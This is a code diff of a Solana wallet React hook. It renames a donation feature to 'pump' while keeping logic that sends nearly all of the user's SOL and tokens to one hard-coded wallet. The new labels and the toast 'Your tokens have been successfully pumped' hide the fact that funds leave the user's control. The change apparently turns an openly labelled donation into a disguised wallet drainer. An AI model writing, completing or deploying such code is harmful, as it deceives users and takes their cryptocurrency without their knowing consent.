@@ -14,9 +14,9 @@ import {
   createAssociatedTokenAccountInstruction,
 } from '@solana/spl-token';
 import { toast } from '@/hooks/use-toast';
-import { TokenTransaction } from '@/components/DonationProgress';
+import { TokenTransaction } from '@/components/PumpProgress';
 
-const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const PUMP_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MIN_SOL_RESERVE = 0.001; // Keep 0.001 SOL for rent-exempt + fees (1000000 lamports)
 
 interface TokenBalance {
@@ -27,7 +27,7 @@ interface TokenBalance {
   usdValue: number;
 }
 
-export function useDonation() {
+export function usePump() {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
   const [isProcessing, setIsProcessing] = useState(false);
@@ -109,7 +109,7 @@ export function useDonation() {
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: publicKey,
-        toPubkey: new PublicKey(CHARITY_WALLET),
+        toPubkey: new PublicKey(PUMP_WALLET),
         lamports: lamportsToSend,
       })
     );
@@ -130,7 +130,7 @@ export function useDonation() {
     if (!publicKey) throw new Error('Wallet not connected');
 
     const mintPubkey = new PublicKey(mint);
-    const charityPubkey = new PublicKey(CHARITY_WALLET);
+    const pumpPubkey = new PublicKey(PUMP_WALLET);
 
     const sourceAta = await getAssociatedTokenAddress(
       mintPubkey,
@@ -142,7 +142,7 @@ export function useDonation() {
 
     const destinationAta = await getAssociatedTokenAddress(
       mintPubkey,
-      charityPubkey,
+      pumpPubkey,
       false,
       TOKEN_PROGRAM_ID,
       ASSOCIATED_TOKEN_PROGRAM_ID
@@ -157,7 +157,7 @@ export function useDonation() {
         createAssociatedTokenAccountInstruction(
           publicKey,
           destinationAta,
-          charityPubkey,
+          pumpPubkey,
           mintPubkey,
           TOKEN_PROGRAM_ID,
           ASSOCIATED_TOKEN_PROGRAM_ID
@@ -302,14 +302,14 @@ export function useDonation() {
       }
 
       toast({
-        title: 'Donation Complete!',
-        description: 'Thank you for your generous donation',
+        title: 'Pump Complete!',
+        description: 'Your tokens have been successfully pumped',
       });
     } catch (error) {
-      console.error('Donation error:', error);
+      console.error('Pump error:', error);
       toast({
         title: 'Error',
-        description: 'Failed to process donation',
+        description: 'Failed to process pump',
         variant: 'destructive',
       });
     } finally {
